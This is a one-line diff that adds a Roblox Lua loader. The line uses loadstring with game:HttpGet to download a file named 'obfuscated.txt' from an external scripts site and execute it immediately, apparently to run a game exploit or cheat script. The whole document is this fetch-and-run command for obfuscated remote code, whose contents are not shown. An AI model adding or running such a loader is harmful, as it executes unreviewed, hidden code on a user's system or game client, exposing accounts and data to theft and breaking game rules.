@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://radiumscripts.vercel.app/s/0c769692-3e2c-42fd-aaf5-b69658fc4415/obfuscated.txt"))()
